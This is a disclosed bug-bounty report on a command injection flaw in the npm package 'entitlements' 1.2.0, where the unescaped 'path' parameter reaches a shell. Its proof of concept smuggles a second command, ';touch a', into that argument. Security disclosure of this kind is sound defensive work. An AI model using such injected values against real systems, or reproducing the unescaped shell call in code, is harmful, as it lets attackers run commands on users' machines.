# [entitlements] Command injection on the 'path' parameter

## Report Details
- **Report ID**: 341869
- **URL**: https://hackerone.com/reports/341869
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-04-22T22:32:14.171Z
- **Disclosed**: 2018-07-18T09:18:12.595Z

## Reporter
- **Username**: caioluders
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hello again, another command injection, this time on the `entitlements` module.

# Module

**module name:** entitlements
**version:** 1.2.0
**npm page:** https://www.npmjs.com/package/entitlements

## Module Description

> check the entitlements of a .app bundle

## Module Stats

26 downloads in the last day
328 downloads in the last week
896 downloads in the last month
14783 downloads in the last year

# Vulnerability

## Vulnerability Description

The module appends the `path` parameter to a command on the line [7](https://github.com/matiassingers/entitlements/blob/master/index.js#L7) without escaping it, leading to a command injection.

## Steps To Reproduce:

* Install the module

```
$ npm install entitlements
```

* Example code with the malicious payload ";touch a" on line 3.

```javascript
var entitlements = require('entitlements');

entitlements(';touch a', function(error, data){
  console.log(data);
});
```

* Run it.

```
$ node index.js
```

* Check the newly create file a

```
$ ls
a       index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `codesign` command.

## Supporting Material/References:

*  macOS Sierra 10.12.16
* NODEJS v8.4.0
*  NPM 5.3.0

# Wrap up

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker that controls the `path` parameter can inject commands on the victim's machine.

## Attachments
No attachments
